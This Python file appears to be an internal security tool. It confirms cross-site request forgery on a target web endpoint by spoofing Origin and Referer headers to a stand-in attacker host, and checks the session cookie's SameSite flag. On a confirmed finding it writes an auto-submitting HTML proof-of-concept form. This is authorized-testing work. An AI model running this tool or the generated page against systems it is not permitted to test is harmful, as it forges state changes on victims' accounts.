#!/usr/bin/env python3
"""
csrf_forge.py — CSRF tester + PoC generator (INTERNAL edition).

Doesn't just spit out a payload — it CONFIRMS the bug first. It logs in, then
replays a state-changing request from a simulated cross-site context (foreign
Origin/Referer, no CSRF token) while carrying the session cookie. It weighs the
result against the cookie's SameSite attribute (which is what actually stops
browser CSRF) and only calls it exploitable when both the server AND the cookie
leave the door open. On a confirmed finding it writes a ready-to-fire HTML PoC.

    python TOOLS/csrf_forge.py --url http://127.0.0.1:8900/ --endpoint /secrets \
        --data "name=pwned&value=csrf" --login /login --user demo --pass demo1234
"""
import argparse
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, FRAMEWORK_VERSION, AuthHandler
from privacy_guard import privacy_user_agent


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


class CSRFForge(VibeTool):
    def __init__(self, base):
        super().__init__("CSRF Forge", "CSRF Tester + PoC Generator")
        self.base = base.rstrip("/")

    def _opener(self):
        import http.cookiejar
        cj = http.cookiejar.CookieJar()
        return urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(cj), _NoRedirect(), AuthHandler), cj

    def _req(self, opener, path, method="GET", data=None, headers=None):
        h = {"User-Agent": privacy_user_agent("CSRF Forge"),
             "Accept": "text/html,application/json,*/*"}
        h.update(headers or {})
        body = None
        if isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
            h["Content-Type"] = "application/x-www-form-urlencoded"
        try:
            req = urllib.request.Request(self.base + path, data=body, method=method, headers=h)
            with opener.open(req, timeout=8) as r:
                return r.getcode(), r.read(20000).decode("utf-8", "replace"), r.headers
        except urllib.error.HTTPError as e:
            return e.code, e.read(20000).decode("utf-8", "replace"), e.headers
        except Exception as e:
            return 0, str(e), {}

    def _login(self, opener, login_path, user, password, user_field, pass_field):
        st, _, hdr = self._req(opener, login_path, "POST",
                               data={user_field: user, pass_field: password})
        try:
            sc = hdr.get("Set-Cookie") or ""
        except Exception:
            sc = ""
        return st in (200, 302, 303), sc

    def _write_poc(self, endpoint, method, fields):
        reports = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "reports")
        os.makedirs(reports, exist_ok=True)
        action = self.base + endpoint
        inputs = "\n    ".join(
            f'<input type="hidden" name="{urllib.parse.quote(k)}" value="{urllib.parse.quote(v)}">'
            for k, v in fields.items())
        html = f"""<!doctype html>
<!-- CSRF proof-of-concept. Open in a browser that is logged in to the target.
     The form auto-submits and performs the state change with the victim's cookie. -->
<html><body onload="document.forms[0].submit()">
  <form action="{action}" method="{method}">
    {inputs}
  </form>
  <p>If you were logged in, the action just fired.</p>
</body></html>"""
        path = os.path.join(reports, "csrf_poc.html")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(html)
        return path

    def run(self, endpoint, method, fields, login_path, user, password, user_field, pass_field, cookie):
        self.banner()
        self.log(f"CSRF test: {method} {self.base}{endpoint}")

        opener, cj = self._opener()
        setcookie = ""
        if cookie:
            # Use a provided cookie directly by seeding a header on each request.
            self.log("Using provided session cookie.")
        elif login_path:
            ok, setcookie = self._login(opener, login_path, user, password, user_field, pass_field)
            self.log(f"Login: {'ESTABLISHED' if ok else 'FAILED'}", "pass" if ok else "warn")

        extra_headers = {"Cookie": cookie} if cookie else {}
        # Baseline: same-site request (should succeed if session is valid) so we
        # know the action itself works before judging the cross-site attempt.
        base_st, base_body, _ = self._req(opener, endpoint, method, data=fields, headers=extra_headers)
        self.log(f"Same-site request -> {base_st}")

        # Cross-site simulation: foreign Origin + Referer, NO CSRF token.
        cross_headers = dict(extra_headers)
        cross_headers["Origin"] = "https://evil.attacker.example"
        cross_headers["Referer"] = "https://evil.attacker.example/csrf.html"
        cross_st, cross_body, _ = self._req(opener, endpoint, method, data=fields, headers=cross_headers)
        self.log(f"Cross-site (foreign Origin/Referer, no token) -> {cross_st}")

        # 2xx = the action ran. 3xx = redirect (typically to a login page), which
        # is a rejection; the old `cross_st < 400` counted that as acceptance.
        server_accepts = 200 <= cross_st < 300
        if 300 <= cross_st < 400:
            self.log("Cross-site request was redirected (login/anti-CSRF redirect) — "
                     "treated as rejected.", "pass")
        # What actually protects the browser: the session cookie's SameSite.
        samesite = ""
        low = setcookie.lower()
        if "samesite=strict" in low:
            samesite = "Strict"
        elif "samesite=lax" in low:
            samesite = "Lax"
        elif setcookie and "samesite" not in low:
            samesite = "None/absent"

        if not server_accepts:
            self.log("Server REJECTED the cross-site request (Origin/Referer check or CSRF token). Protected.", "pass")
            return 0

        # Server has no server-side CSRF defense. Does SameSite save it?
        if samesite in ("Strict", "Lax") and method.upper() != "GET":
            self.log(f"Server accepts token-less cross-origin {method}, BUT the session cookie is "
                     f"SameSite={samesite} — a browser won't send it cross-site, so real-world CSRF "
                     f"is blocked. Fix: add a CSRF token; don't rely on SameSite alone.", "warn")
            return 0

        # Exploitable: no server check AND cookie is sent cross-site.
        poc = self._write_poc(endpoint, method, fields)
        self.log(f"CSRF CONFIRMED — token-less cross-origin {method} accepted and cookie is "
                 f"{samesite or 'sent cross-site'}. State change is forgeable from any site.", "hack")
        self.log(f"PoC written: {poc}", "crit")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="CSRF Forge - CSRF tester + PoC generator")
    p.add_argument("--url", required=True, help="Target base URL you own/are authorized to test")
    p.add_argument("--endpoint", required=True, help="State-changing endpoint, e.g. /secrets")
    p.add_argument("--method", default="POST", help="HTTP method (default POST)")
    p.add_argument("--data", default="", help="Action fields, e.g. 'name=x&value=y'")
    p.add_argument("--login", default="", help="Login path to establish a session")
    p.add_argument("--user", default="", help="Username/email for --login")
    p.add_argument("--pass", dest="password", default="", help="Password for --login")
    p.add_argument("--user-field", default="username")
    p.add_argument("--pass-field", default="password")
    p.add_argument("--cookie", default="", help="Use an existing session cookie instead of --login")
    p.add_argument("-v", "--version", action="version", version=f"CSRF Forge {FRAMEWORK_VERSION}")
    args = p.parse_args(argv)
    fields = dict(urllib.parse.parse_qsl(args.data)) if args.data else {}
    return CSRFForge(args.url).run(args.endpoint, args.method, fields, args.login, args.user,
                                   args.password, args.user_field, args.pass_field, args.cookie)


if __name__ == "__main__":
    sys.exit(main())
